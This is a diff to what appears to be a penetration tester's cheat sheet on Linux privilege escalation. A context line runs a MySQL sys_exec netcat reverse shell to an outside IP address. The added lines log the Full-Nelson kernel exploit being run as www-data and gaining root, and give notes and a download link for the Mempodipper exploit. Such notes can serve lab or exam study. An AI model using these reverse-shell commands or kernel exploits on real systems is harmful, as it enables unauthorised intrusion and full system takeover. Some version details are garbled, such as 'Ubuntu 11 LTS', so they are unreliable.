@@ -665,6 +665,23 @@ select sys_exec('nc 192.168.49.66 22 -e /bin/bash');
 
 # LINUX KERNEL EXPLOITS
 ```bash
+Linux version 2.6.32-21-generic (buildd@rothera) (gcc version 4.4.3 (Ubuntu 4.4.3-4ubuntu5) ) #32-Ubuntu SMP Fri Apr 16 08:10:02 UTC 2010                                          Distributor ID: Ubuntu
+Description:    Ubuntu 10.04.3 LTS
+Release:        10.04
+2.6.37 (RedHat / Ubuntu 10.04) - 'Full-Nelson.c' Local Privilege Escalation | linux/local/15704.c
+
+www-data@offsecsrv:/tmp$ ./NO*
+./NO*
+[*] Resolving kernel addresses...
+ [+] Resolved econet_ioctl to 0xf82032d0
+ [+] Resolved econet_ops to 0xf82033c0
+ [+] Resolved commit_creds to 0xc016dcc0
+ [+] Resolved prepare_kernel_cred to 0xc016e000
+[*] Calculating target...
+[*] Triggering payload...
+[*] Got root!
+# cd /root
+
 Success:
 ===============================
 =          Mempodipper        =
@@ -672,6 +689,9 @@ Success:
 =         Jan 21, 2012        =
 ===============================
 OS: Linux version 3.0.0-12-server (buildd@crested) (gcc version 4.6.1 (Ubuntu/Linaro 4.6.1-9ubuntu3) ) #20-Ubuntu SMP Fri Oct 7 16:36:30 UTC 2011
+Distributor ID: Ubuntu
+Description:    Ubuntu 11 LTS
+Release:        11
 Memodripper https://www.kernel-exploits.com/media/memodipper.c
 x64 on Kali worked natty. x86 on my Ubuntu was not reconized. Makes sense.
 
